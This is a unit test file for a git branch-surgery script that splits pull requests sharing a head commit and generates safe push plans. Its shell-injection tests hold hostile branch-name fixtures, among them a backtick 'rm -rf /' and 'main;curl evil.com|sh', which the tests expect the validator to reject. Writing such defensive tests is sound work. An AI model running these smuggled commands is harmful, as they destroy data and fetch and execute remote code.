"""Unit tests for scripts/branch_surgery.py."""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(
    0,
    str(
        Path(__file__).resolve().parent.parent
        / "skills"
        / "deepseek-forge"
        / "scripts"
    ),
)

import branch_surgery as bs


# Sample PR fixture data
_SAMPLE_PRS = [
    {
        "number": 1,
        "title": "Add login feature",
        "headRefName": "feat/login",
        "baseRefName": "main",
        "headRefOid": "abc123def456",
        "baseRefOid": "main00000001",
        "state": "OPEN",
        "url": "https://github.com/test/repo/pull/1",
        "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
        "headRepositoryOwner": {"login": "test"},
    },
    {
        "number": 2,
        "title": "Add signup feature",
        "headRefName": "feat/signup",
        "baseRefName": "main",
        "headRefOid": "abc123def456",  # Same head as PR #1!
        "baseRefOid": "main00000001",
        "state": "OPEN",
        "url": "https://github.com/test/repo/pull/2",
        "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
        "headRepositoryOwner": {"login": "test"},
    },
    {
        "number": 3,
        "title": "Fix typo in README",
        "headRefName": "fix/typo",
        "baseRefName": "main",
        "headRefOid": "xyz789abc012",
        "baseRefOid": "main00000002",
        "state": "OPEN",
        "url": "https://github.com/test/repo/pull/3",
        "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
        "headRepositoryOwner": {"login": "test"},
    },
]

# Fork PR fixture
_FORK_PR = {
    "number": 4,
    "title": "Fix from external contributor",
    "headRefName": "feat/external-fix",
    "baseRefName": "main",
    "headRefOid": "def789012",
    "baseRefOid": "main00000003",
    "state": "OPEN",
    "url": "https://github.com/test/repo/pull/4",
    "headRepository": {"name": "repo", "sshUrl": "git@github.com:contributor/repo.git"},
    "headRepositoryOwner": {"login": "contributor"},
}


class TestSharedHeadDetection(unittest.TestCase):
    """Tests for find_shared_heads()."""

    def test_detects_shared_head(self):
        groups = bs.find_shared_heads(_SAMPLE_PRS)
        self.assertIn("abc123def456", groups)
        self.assertEqual(len(groups["abc123def456"]), 2)

    def test_no_shared_heads(self):
        prs = [
            {"headRefOid": "aaa", "number": 1, "title": "A"},
            {"headRefOid": "bbb", "number": 2, "title": "B"},
        ]
        groups = bs.find_shared_heads(prs)
        self.assertEqual(len(groups), 0)

    def test_empty_pr_list(self):
        groups = bs.find_shared_heads([])
        self.assertEqual(groups, {})

    def test_single_pr_no_shared_head(self):
        prs = [{"headRefOid": "aaa", "number": 1, "title": "A"}]
        groups = bs.find_shared_heads(prs)
        self.assertEqual(len(groups), 0)

    def test_missing_headRefOid(self):
        prs = [
            {"number": 1, "title": "A"},
            {"number": 2, "title": "B"},
        ]
        groups = bs.find_shared_heads(prs)
        self.assertEqual(len(groups), 0)

    def test_triple_shared_head(self):
        prs = [
            {"headRefOid": "same", "number": 1, "title": "A"},
            {"headRefOid": "same", "number": 2, "title": "B"},
            {"headRefOid": "same", "number": 3, "title": "C"},
        ]
        groups = bs.find_shared_heads(prs)
        self.assertEqual(len(groups["same"]), 3)


class TestSplitPlanGeneration(unittest.TestCase):
    """Tests for generate_split_plan()."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.tmp.cleanup()

    def test_generates_plan_for_shared_head(self):
        shared = {"abc123def456": _SAMPLE_PRS[:2]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc123","messageHeadline":"feat: login"}]}'):
            with patch("branch_surgery.run_git", return_value="dummy-sha\n"):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))
        self.assertEqual(len(plans), 2)
        # First plan
        self.assertEqual(plans[0]["pr_number"], 1)
        self.assertIn("feat/login-pr-1", plans[0]["suggested_new_branch"])
        self.assertIn("force-with-lease", plans[0]["safe_push_command"])
        self.assertTrue(len(plans[0]["branch_create_commands"]) > 0)
        self.assertTrue(len(plans[0]["cherry_pick_commands"]) > 0)
        # Second plan
        self.assertEqual(plans[1]["pr_number"], 2)
        self.assertIn("feat/signup-pr-2", plans[1]["suggested_new_branch"])
        self.assertTrue(len(plans[1]["branch_create_commands"]) > 0)

    def test_safe_push_command_format(self):
        shared = {"abc123def456": [_SAMPLE_PRS[0]]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[]}'):
            # _resolve_push_remote calls run_git(["remote", "-v"]) first, then ls-remote
            def _git_side_effect(args, cwd=None):
                args_t = tuple(args)
                if args_t == ("remote", "-v"):
                    return _SAME_REPO_REMOTES
                if args_t[0] == "ls-remote":
                    return "remote-sha-abc\n"
                return "remote-sha-abc\n"
            with patch("branch_surgery.run_git", side_effect=_git_side_effect):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))
        cmd = plans[0]["safe_push_command"]
        self.assertIn("--force-with-lease", cmd)
        self.assertIn("origin", cmd)

    def test_empty_shared_yields_empty_plan(self):
        plans = bs.generate_split_plan({}, Path(self.tmp.name))
        self.assertEqual(plans, [])

    def test_cherry_pick_commands_present(self):
        shared = {"abc123def456": [_SAMPLE_PRS[0]]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value="sha\n"):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))
        cmds = plans[0]["cherry_pick_commands"]
        cmd_text = "\n".join(cmds)
        self.assertIn("git cherry-pick", cmd_text)

    def test_no_gh_fallback(self):
        """When gh returns empty, plan includes warning about manual identification."""
        shared = {"abc123def456": [_SAMPLE_PRS[0]]}
        with patch("branch_surgery._try_gh", return_value=""):
            with patch("branch_surgery.run_git", return_value="sha\n"):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))
        cmds = plans[0]["branch_create_commands"]
        cmd_text = "\n".join(cmds)
        self.assertIn("WARNING", cmd_text)

    def test_same_base_and_head_warns_manual_review(self):
        """When PRs share both base AND head, commits are genuinely overlapping.
        The plan must warn about manual review, and cherry-picks are commented out."""
        shared = {"abc123def456": _SAMPLE_PRS[:2]}

        # Mock gh to return commits, so the same-base path generates commented-out picks.
        with patch("branch_surgery._try_gh",
                   return_value='{"commits":[{"oid":"abc001","messageHeadline":"feat: shared commit"}]}'):
            with patch("branch_surgery.run_git", return_value=""):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))

        self.assertEqual(len(plans), 2)
        for plan in plans:
            cmds = "\n".join(plan["branch_create_commands"])
            self.assertIn("MANUAL REVIEW required", cmds,
                          f"PR #{plan['pr_number']} should warn about manual review")
            cp = "\n".join(plan["cherry_pick_commands"])
            self.assertIn("# git cherry-pick", cp,
                          f"PR #{plan['pr_number']} cherry-picks should be commented out")

    def test_fetch_command_in_plan(self):
        """Every plan should include a fetch command."""
        shared = {"abc123def456": [_SAMPLE_PRS[0]]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"c"}]}'):
            with patch("branch_surgery.run_git", return_value="sha\n"):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))
        self.assertIn("git fetch", plans[0]["fetch_commands"][0])

    def test_shared_head_prs_get_file_isolated_commits(self):
        """When 2 PRs share a head but files differ AND bases differ, cherry-pick sets differ."""
        # Make PR #2 have a different base so same_base is False
        prs_with_diff_base = [
            dict(_SAMPLE_PRS[0]),
            dict(_SAMPLE_PRS[1], **{"baseRefName": "develop"}),
        ]
        shared = {"abc123def456": prs_with_diff_base}

        pr_files_responses = {
            "1": '{"files":[{"path":"src/login/login.py"},{"path":"src/login/__init__.py"}]}',
            "2": '{"files":[{"path":"src/signup/signup.py"}]}',
        }

        def _mock_try_gh(args):
            if "--json" in args and "files" in args:
                pr_num = args[2]  # ["pr", "view", "<number>", "--json", "files"]
                return pr_files_responses.get(pr_num, "")
            return ""

        def _mock_run_git(args, cwd=None):
            key = tuple(args)
            # PR #1 base=main, PR #2 base=develop (set above in prs_with_diff_base)
            git_responses = {
                ("log", "--oneline", "--format=%H", "main..abc123def456", "--",
                 "src/login/login.py", "src/login/__init__.py"):
                    "abc001\nabc002\n",
                ("log", "--oneline", "main..abc123def456", "--",
                 "src/login/login.py", "src/login/__init__.py"):
                    "abc001 login: add login form\nabc002 login: add validation\n",
                ("log", "--oneline", "--format=%H", "develop..abc123def456", "--",
                 "src/signup/signup.py"):
                    "abc003\n",
                ("log", "--oneline", "develop..abc123def456", "--",
                 "src/signup/signup.py"):
                    "abc003 signup: add registration\n",
            }
            if key in git_responses:
                return git_responses[key]
            if args[0] == "remote":
                return _SAME_REPO_REMOTES
            if args[0] == "ls-remote":
                return "sha\n"
            return "sha\n"

        with patch("branch_surgery._try_gh", side_effect=_mock_try_gh):
            with patch("branch_surgery.run_git", side_effect=_mock_run_git):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))

        self.assertEqual(len(plans), 2)

        # PR #1 gets login commits only
        cp1 = "\n".join(plans[0]["cherry_pick_commands"])
        self.assertIn("abc001", cp1, "PR #1 should have login commit abc001")
        self.assertIn("abc002", cp1, "PR #1 should have login commit abc002")
        self.assertNotIn("abc003", cp1, "PR #1 should NOT have signup commit abc003")

        # PR #2 gets signup commits only
        cp2 = "\n".join(plans[1]["cherry_pick_commands"])
        self.assertIn("abc003", cp2, "PR #2 should have signup commit abc003")
        self.assertNotIn("abc001", cp2, "PR #2 should NOT have login commit abc001")


class TestForkRemoteResolution(unittest.TestCase):
    """Tests for fork remote name resolution."""

    def test_known_fork_remote_returns_remote_name(self):
        """When fork owner appears in a configured remote, return the remote name."""
        remotes = (
            "origin\tgit@github.com:test/repo.git (fetch)\n"
            "contrib\tgit@github.com:contributor/repo.git (fetch)\n"
        )
        with patch("branch_surgery.run_git", return_value=remotes):
            remote = bs._resolve_push_remote(_FORK_PR, Path("/tmp"))
        self.assertEqual(remote, "contrib")

    def test_unknown_fork_returns_ssh_url(self):
        """When fork owner has no configured remote, return the SSH URL."""
        remotes = "origin\tgit@github.com:test/repo.git (fetch)\n"
        with patch("branch_surgery.run_git", return_value=remotes):
            remote = bs._resolve_push_remote(_FORK_PR, Path("/tmp"))
        self.assertIn("contributor", remote)
        self.assertIn("git@", remote)

    def test_fork_is_detected_via_ssh_url(self):
        """Push target being a URL (not a remote name) is a fork."""
        remotes = "origin\tgit@github.com:test/repo.git (fetch)\n"
        with patch("branch_surgery.run_git", return_value=remotes):
            is_fork = bs._is_fork_pr(_FORK_PR, Path("/tmp"))
        self.assertTrue(is_fork)


class TestShellInjectionPrevention(unittest.TestCase):
    """Tests that malicious branch names are sanitised in shell commands."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.tmp.cleanup()

    def test_malicious_head_ref_is_rejected(self):
        """A headRefName with shell metacharacters raises ValueError."""
        malicious_pr = {
            "number": 99,
            "title": "Evil PR",
            "headRefName": "feat/x;echo-owned",
            "baseRefName": "main",
            "headRefOid": "abc123def456",
            "baseRefOid": "main00000001",
            "state": "OPEN",
            "url": "https://github.com/test/repo/pull/99",
            "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
            "headRepositoryOwner": {"login": "test"},
        }
        shared = {"abc123def456": [malicious_pr]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[]}'):
            with patch("branch_surgery.run_git", return_value=""):
                with self.assertRaises(ValueError):
                    bs.generate_split_plan(shared, Path(self.tmp.name))

    def test_malicious_head_ref_with_backticks_rejected(self):
        """Backtick injection in branch name raises ValueError."""
        malicious_pr = {
            "number": 99,
            "title": "Evil PR",
            "headRefName": "feat/x`rm -rf /`",
            "baseRefName": "main",
            "headRefOid": "abc123def456",
            "baseRefOid": "main00000001",
            "state": "OPEN",
            "url": "https://github.com/test/repo/pull/99",
            "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
            "headRepositoryOwner": {"login": "test"},
        }
        shared = {"abc123def456": [malicious_pr]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[]}'):
            with patch("branch_surgery.run_git", return_value=""):
                with self.assertRaises(ValueError):
                    bs.generate_split_plan(shared, Path(self.tmp.name))

    def test_normal_ref_passes_validation(self):
        """A normal branch name passes validation and produces quoted output."""
        normal_pr = {
            "number": 1,
            "title": "Safe PR",
            "headRefName": "feature/my-safe-branch",
            "baseRefName": "main",
            "headRefOid": "abc123def456",
            "baseRefOid": "main00000001",
            "state": "OPEN",
            "url": "https://github.com/test/repo/pull/1",
            "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
            "headRepositoryOwner": {"login": "test"},
        }
        shared = {"abc123def456": [normal_pr]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc123def456","messageHeadline":"safe commit"}]}'):
            with patch("branch_surgery.run_git", return_value=""):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))
        self.assertEqual(len(plans), 1)
        # Commands should contain the quoted ref name.
        self.assertIn("feature/my-safe-branch", plans[0]["branch_create_commands"][-1])

    def test_malicious_base_ref_is_rejected(self):
        """Injection in baseRefName is also caught."""
        malicious_pr = {
            "number": 99,
            "title": "Evil PR",
            "headRefName": "feat/x",
            "baseRefName": "main;curl evil.com|sh",
            "headRefOid": "abc123def456",
            "baseRefOid": "main00000001",
            "state": "OPEN",
            "url": "https://github.com/test/repo/pull/99",
            "headRepository": {"name": "repo", "sshUrl": "git@github.com:test/repo.git"},
            "headRepositoryOwner": {"login": "test"},
        }
        shared = {"abc123def456": [malicious_pr]}
        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"c"}]}'):
            with patch("branch_surgery.run_git", return_value=""):
                with self.assertRaises(ValueError):
                    bs.generate_split_plan(shared, Path(self.tmp.name))


class TestSafePushCommandPurity(unittest.TestCase):
    """Verify that generated push commands never contain raw, unquoted variables."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.tmp.cleanup()

    def test_push_command_uses_only_safe_variables(self):
        """The safe_push_cmd must not contain raw head_ref, base_ref, or
        suggested_branch interpolations — only their quoted safe variants."""
        pr = dict(_SAMPLE_PRS[0], headRefName="feat/has.dot_name")
        shared = {"abc123def456": [pr]}
        with patch("branch_surgery._try_gh",
                   return_value='{"commits":[{"oid":"abc123def","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value=""):
                with patch("branch_surgery._safe_ref",
                           side_effect=lambda name, label="ref": f"SAFE({name})"):
                    with patch("branch_surgery._safe_remote",
                               side_effect=lambda remote: f"REMOTE({remote})"):
                        plans = bs.generate_split_plan(shared, Path(self.tmp.name))

        cmd = plans[0]["safe_push_command"]
        self.assertIn(
            "REMOTE(git@github.com:test/repo.git) "
            "SAFE(feat/has.dot_name-pr-1):refs/heads/SAFE(feat/has.dot_name)",
            cmd,
        )
        self.assertNotIn(
            " git@github.com:test/repo.git "
            "feat/has.dot_name-pr-1:refs/heads/feat/has.dot_name",
            cmd,
        )

    def test_push_command_contains_no_control_chars(self):
        """Push commands must be a single logical line with no embedded newlines."""
        shared = {"abc123def456": [_SAMPLE_PRS[0]]}
        with patch("branch_surgery._try_gh",
                   return_value='{"commits":[{"oid":"abc123def","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value=""):
                plans = bs.generate_split_plan(shared, Path(self.tmp.name))

        cmd = plans[0]["safe_push_command"]
        self.assertNotIn("\n", cmd.split("#")[0] if "#" in cmd else cmd,
                         "Active push command line must not contain newlines")


class TestSafeRefConservativePolicy(unittest.TestCase):
    """Document the conservative ref whitelist behaviour."""

    def test_plus_sign_is_rejected(self):
        """feature/foo+bar is a valid git ref but our conservative subset rejects it."""
        with self.assertRaises(ValueError):
            bs._safe_ref("feature/foo+bar")

    def test_at_sign_is_rejected(self):
        with self.assertRaises(ValueError):
            bs._safe_ref("feature/@mention")

    def test_tilde_is_rejected(self):
        with self.assertRaises(ValueError):
            bs._safe_ref("feat~1")

    def test_caret_is_rejected(self):
        with self.assertRaises(ValueError):
            bs._safe_ref("feat^")

    def test_normal_ref_accepted(self):
        result = bs._safe_ref("feature/my-safe-branch")
        # shlex.quote returns the bare string when no quoting is needed.
        self.assertEqual(result, "feature/my-safe-branch")


class TestVerificationChecklist(unittest.TestCase):
    """Tests for generate_verification_checklist()."""

    def test_checklist_has_six_steps(self):
        plans = [{
            "pr_number": 1,
            "pr_title": "Test PR",
            "head_ref": "feat/test",
            "base_ref": "main",
            "is_fork": False,
            "push_remote": "origin",
            "suggested_new_branch": "feat/test-pr-1",
            "safe_push_command": "git push --force-with-lease=origin/feat/test:abc origin feat/test-pr-1:feat/test",
            "fetch_commands": ["git fetch origin refs/heads/feat/test"],
            "branch_create_commands": ["git checkout -b feat/test-pr-1 origin/main"],
            "cherry_pick_commands": ["git cherry-pick abc123"],
            "remote_head_sha": "abc",
        }]
        checklist = bs.generate_verification_checklist(plans)
        text = "\n".join(checklist)

        # Six-step structure (0-5)
        self.assertIn("Step 0: Fetch commits", text)
        self.assertIn("Step 1: Create independent branch", text)
        self.assertIn("Step 2: Cherry-pick PR commits", text)
        self.assertIn("Step 3: Verify the new branch", text)
        self.assertIn("Step 4: Push", text)
        self.assertIn("Step 5: Post-push verification", text)

    def test_checklist_includes_all_verification_items(self):
        plans = [{
            "pr_number": 1,
            "pr_title": "Test PR",
            "head_ref": "feat/test",
            "base_ref": "main",
            "is_fork": False,
            "push_remote": "origin",
            "suggested_new_branch": "feat/test-pr-1",
            "safe_push_command": "git push --force-with-lease=origin/feat/test:abc origin feat/test-pr-1:feat/test",
            "branch_create_commands": ["git checkout -b feat/test-pr-1 origin/main"],
            "cherry_pick_commands": ["git cherry-pick abc123"],
            "remote_head_sha": "abc",
        }]
        checklist = bs.generate_verification_checklist(plans)
        text = "\n".join(checklist)

        # Should include the four verification dimensions from the todo.md
        self.assertIn("commits", text.lower())
        self.assertIn("files", text.lower())
        self.assertIn("head sha", text.lower())
        self.assertIn("base ref", text.lower())
        # Should include push command
        self.assertIn("force-with-lease", text)

    def test_fork_pr_checklist_mentions_fork(self):
        plans = [{
            "pr_number": 4,
            "pr_title": "Fork fix",
            "head_ref": "feat/external-fix",
            "base_ref": "main",
            "is_fork": True,
            "push_remote": "git@github.com:contributor/repo.git",
            "suggested_new_branch": "feat/external-fix-pr-4",
            "safe_push_command": "git push --force-with-lease=refs/heads/feat/external-fix:abc git@github.com:contributor/repo.git feat/external-fix-pr-4:refs/heads/feat/external-fix",
            "branch_create_commands": ["git checkout -b feat/external-fix-pr-4 origin/main"],
            "cherry_pick_commands": ["git cherry-pick abc123"],
            "remote_head_sha": "abc",
        }]
        checklist = bs.generate_verification_checklist(plans)
        text = "\n".join(checklist)
        self.assertIn("Fork PR detected", text)

    def test_empty_plans_yields_empty_checklist(self):
        checklist = bs.generate_verification_checklist([])
        self.assertEqual(checklist, [])


_SAME_REPO_REMOTES = "origin  git@github.com:test/repo.git (fetch)\norigin  git@github.com:test/repo.git (push)\n"


class TestForkDetection(unittest.TestCase):
    """Tests for _resolve_push_remote and _is_fork_pr."""

    def test_same_repo_pr_uses_origin(self):
        with patch("branch_surgery.run_git", return_value=_SAME_REPO_REMOTES):
            remote = bs._resolve_push_remote(_SAMPLE_PRS[0], Path("/tmp"))
        self.assertEqual(remote, "origin")

    def test_same_repo_pr_not_fork(self):
        with patch("branch_surgery.run_git", return_value=_SAME_REPO_REMOTES):
            is_fork = bs._is_fork_pr(_SAMPLE_PRS[0], Path("/tmp"))
        self.assertFalse(is_fork)

    def test_fork_pr_detects_different_remote(self):
        with patch("branch_surgery.run_git", return_value=_SAME_REPO_REMOTES):
            remote = bs._resolve_push_remote(_FORK_PR, Path("/tmp"))
        self.assertIn("contributor", remote)

    def test_fork_pr_is_fork_true(self):
        with patch("branch_surgery.run_git", return_value=_SAME_REPO_REMOTES):
            is_fork = bs._is_fork_pr(_FORK_PR, Path("/tmp"))
        self.assertTrue(is_fork)

    def test_fork_pr_no_head_repo_falls_back(self):
        pr = {"number": 5, "headRefName": "feat/x", "headRepositoryOwner": None}
        remote = bs._resolve_push_remote(pr, Path("/tmp"))
        self.assertEqual(remote, "origin")


class TestFetchPrCommits(unittest.TestCase):
    """Tests for fetch_pr_commits()."""

    def test_returns_commit_list(self):
        response = '{"commits":[{"oid":"abc123","messageHeadline":"feat: add login"}]}'
        with patch("branch_surgery._try_gh", return_value=response):
            commits = bs.fetch_pr_commits(1)
        self.assertEqual(len(commits), 1)
        self.assertEqual(commits[0]["oid"], "abc123")

    def test_returns_empty_on_no_commits(self):
        with patch("branch_surgery._try_gh", return_value='{"commits":[]}'):
            commits = bs.fetch_pr_commits(1)
        self.assertEqual(commits, [])

    def test_returns_empty_on_gh_unavailable(self):
        with patch("branch_surgery._try_gh", return_value=""):
            commits = bs.fetch_pr_commits(1)
        self.assertEqual(commits, [])

    def test_returns_empty_on_invalid_json(self):
        with patch("branch_surgery._try_gh", return_value="not json"):
            commits = bs.fetch_pr_commits(1)
        self.assertEqual(commits, [])


class TestReportGeneration(unittest.TestCase):
    """Tests for generate_report()."""

    def test_report_has_required_sections(self):
        report = bs.generate_report(
            branch_info={
                "current_branch": "feat/test",
                "remotes": "origin  git@github.com:test/repo.git (fetch)",
                "branches": "* feat/test\n  main",
                "commit_graph": "* abc123 feat: test",
                "merge_base": "feat/test..origin/main: def456",
            },
            prs=_SAMPLE_PRS,
            shared_groups={"abc123def456": _SAMPLE_PRS[:2]},
            plans=[],
            checklist=[],
        )

        required = [
            "# Branch Surgery Report",
            "## Summary",
            "## Current Branch Topology",
            "## Open PRs",
            "## Shared Head SHA Analysis",
            "## Safety Notes",
        ]
        for section in required:
            self.assertIn(section, report, f"Missing: {section}")

    def test_report_contains_dry_run_warning(self):
        report = bs.generate_report(
            branch_info={"current_branch": "", "remotes": "", "branches": "",
                         "commit_graph": "", "merge_base": ""},
            prs=[],
            shared_groups={},
            plans=[],
            checklist=[],
        )
        self.assertIn("dry-run", report.lower())
        self.assertIn("No git mutations have been executed", report)

    def test_report_no_shared_heads_shows_no_action(self):
        report = bs.generate_report(
            branch_info={"current_branch": "", "remotes": "", "branches": "",
                         "commit_graph": "", "merge_base": ""},
            prs=_SAMPLE_PRS,
            shared_groups={},
            plans=[],
            checklist=[],
        )
        self.assertIn("No Action Required", report)
        self.assertIn("No PR branch topology issues were detected", report)

    def test_report_safety_notes(self):
        report = bs.generate_report(
            branch_info={"current_branch": "", "remotes": "", "branches": "",
                         "commit_graph": "", "merge_base": ""},
            prs=[],
            shared_groups={},
            plans=[],
            checklist=[],
        )
        self.assertIn("--force-with-lease", report)
        self.assertIn("does NOT execute any commands", report)


class TestGitHelpers(unittest.TestCase):
    """Tests for git helper functions."""

    def test_run_git_returns_empty_on_failure(self):
        result = bs.run_git(["nonexistent-git-command-xyz"], Path("/tmp"))
        self.assertEqual(result, "")

    @patch("branch_surgery.subprocess.run")
    def test_run_git_returns_stdout(self, mock_run):
        mock_result = MagicMock()
        mock_result.stdout = "success\n"
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        result = bs.run_git(["status"], Path("/tmp"))
        self.assertEqual(result, "success\n")

    @patch("branch_surgery.subprocess.run")
    def test_run_git_file_not_found(self, mock_run):
        mock_run.side_effect = FileNotFoundError
        result = bs.run_git(["status"], Path("/tmp"))
        self.assertEqual(result, "")

    @patch("branch_surgery.subprocess.run")
    def test_run_git_timeout(self, mock_run):
        import subprocess
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="git", timeout=30)
        result = bs.run_git(["status"], Path("/tmp"))
        self.assertEqual(result, "")


class TestCLI(unittest.TestCase):
    """Tests for the argument parser and CLI entry point."""

    def test_parser_output_is_optional(self):
        parser = bs.create_parser()
        args = parser.parse_args([])
        self.assertIsNone(args.output)
        self.assertIsNone(args.pr_list)

    def test_parser_with_output_only(self):
        parser = bs.create_parser()
        args = parser.parse_args(["--output", "report.md"])
        self.assertEqual(args.output, "report.md")
        self.assertIsNone(args.pr_list)

    def test_parser_with_pr_list(self):
        parser = bs.create_parser()
        args = parser.parse_args([
            "--output", "report.md",
            "--pr-list", '[{"number":1}]',
        ])
        self.assertEqual(args.pr_list, '[{"number":1}]')

    def test_parser_repo_root_default(self):
        parser = bs.create_parser()
        args = parser.parse_args(["--output", "report.md"])
        self.assertEqual(args.repo_root, ".")

    def test_main_writes_output_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            output = Path(tmp) / "report.md"
            argv = [
                "--output", str(output),
                "--pr-list", json.dumps(_SAMPLE_PRS),
            ]
            with patch("branch_surgery.run_git", return_value=""):
                bs.main(argv)
            self.assertTrue(output.exists())
            content = output.read_text()
            self.assertIn("# Branch Surgery Report", content)

    def test_main_invalid_json_exits(self):
        argv = ["--output", "/tmp/test.md", "--pr-list", "not-json"]
        with self.assertRaises(SystemExit):
            bs.main(argv)


class TestIntegration(unittest.TestCase):
    """End-to-end test with mocked git and gh."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.tmp.cleanup()

    def test_full_flow_with_shared_heads(self):
        output = Path(self.tmp.name) / "surgery.md"

        argv = [
            "--output", str(output),
            "--pr-list", json.dumps(_SAMPLE_PRS),
            "--repo-root", self.tmp.name,
        ]

        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value="test-output\n"):
                bs.main(argv)

        self.assertTrue(output.exists())
        content = output.read_text()

        # Verify key sections exist
        self.assertIn("Shared Head SHA Analysis", content)
        self.assertIn("abc123def456", content)
        self.assertIn("Split Plan", content)
        self.assertIn("Execution Plan", content)
        self.assertIn("Safety Notes", content)

        # Verify both PRs are mentioned
        self.assertIn("Add login feature", content)
        self.assertIn("Add signup feature", content)

        # Verify force-with-lease is in push commands
        self.assertIn("--force-with-lease", content)

    def test_full_flow_includes_risk_assessment(self):
        output = Path(self.tmp.name) / "surgery.md"

        argv = [
            "--output", str(output),
            "--pr-list", json.dumps(_SAMPLE_PRS),
            "--repo-root", self.tmp.name,
        ]

        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value="test-output\n"):
                bs.main(argv)

        self.assertTrue(output.exists())
        content = output.read_text()

        self.assertIn("## Risk Assessment", content)
        self.assertIn("Force-push risk", content)
        self.assertIn("Shared-head risk", content)
        self.assertIn("Cherry-pick conflict risk", content)
        self.assertIn("CI disruption risk", content)

    def test_full_flow_includes_rollback_plan(self):
        output = Path(self.tmp.name) / "surgery.md"

        argv = [
            "--output", str(output),
            "--pr-list", json.dumps(_SAMPLE_PRS),
            "--repo-root", self.tmp.name,
        ]

        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value="test-output\n"):
                bs.main(argv)

        self.assertTrue(output.exists())
        content = output.read_text()

        self.assertIn("## Rollback Plan", content)
        self.assertIn("backup/feat/login", content)
        self.assertIn("backup/feat/signup", content)
        self.assertIn("To restore", content)

    def test_no_plans_excludes_risk_and_rollback(self):
        """When there are no shared heads (no plans), risk assessment
        and rollback plan sections should not appear."""
        output = Path(self.tmp.name) / "surgery.md"

        # PRs with no shared heads
        distinct_prs = [
            {
                "number": 1, "title": "A", "headRefName": "feat/a",
                "baseRefName": "main", "headRefOid": "aaa111", "baseRefOid": "main1",
                "state": "OPEN", "url": "https://github.com/test/repo/pull/1",
                "headRepository": {"name": "repo"},
                "headRepositoryOwner": {"login": "test"},
            },
            {
                "number": 2, "title": "B", "headRefName": "feat/b",
                "baseRefName": "main", "headRefOid": "bbb222", "baseRefOid": "main2",
                "state": "OPEN", "url": "https://github.com/test/repo/pull/2",
                "headRepository": {"name": "repo"},
                "headRepositoryOwner": {"login": "test"},
            },
        ]

        argv = [
            "--output", str(output),
            "--pr-list", json.dumps(distinct_prs),
            "--repo-root", self.tmp.name,
        ]

        with patch("branch_surgery._try_gh", return_value='{"commits":[{"oid":"abc","messageHeadline":"commit"}]}'):
            with patch("branch_surgery.run_git", return_value="test-output\n"):
                bs.main(argv)

        self.assertTrue(output.exists())
        content = output.read_text()

        self.assertNotIn("## Risk Assessment", content)
        self.assertNotIn("## Rollback Plan", content)
        self.assertIn("No Action Required", content)


class TestRiskAssessment(unittest.TestCase):
    """Tests for _assess_risks()."""

    def test_all_risks_for_fork_pr(self):
        plan = {
            "pr_number": 4,
            "head_ref": "feat/external",
            "shared_head_sha": "abc123def456789",
            "remote_head_sha": "abc123",
            "push_remote": "git@github.com:contributor/repo.git",
            "is_fork": True,
            "pr_commit_count": 3,
        }
        risks = bs._assess_risks(plan)
        self.assertEqual(len(risks), 5)
        risk_labels = {r.split(":")[0] for r in risks}
        self.assertIn("Force-push risk", risk_labels)
        self.assertIn("Shared-head risk", risk_labels)
        self.assertIn("Fork risk", risk_labels)
        self.assertIn("Cherry-pick conflict risk", risk_labels)
        self.assertIn("CI disruption risk", risk_labels)

    def test_no_fork_risk_for_origin_pr(self):
        plan = {
            "pr_number": 1,
            "head_ref": "feat/test",
            "shared_head_sha": "abc123",
            "remote_head_sha": "abc123",
            "push_remote": "origin",
            "is_fork": False,
            "pr_commit_count": 1,
        }
        risks = bs._assess_risks(plan)
        risk_labels = {r.split(":")[0] for r in risks}
        self.assertNotIn("Fork risk", risk_labels)

    def test_no_cherry_pick_risk_when_zero_commits(self):
        plan = {
            "pr_number": 1,
            "head_ref": "feat/test",
            "shared_head_sha": "abc123",
            "remote_head_sha": "abc123",
            "push_remote": "origin",
            "is_fork": False,
            "pr_commit_count": 0,
        }
        risks = bs._assess_risks(plan)
        risk_labels = {r.split(":")[0] for r in risks}
        self.assertNotIn("Cherry-pick conflict risk", risk_labels)

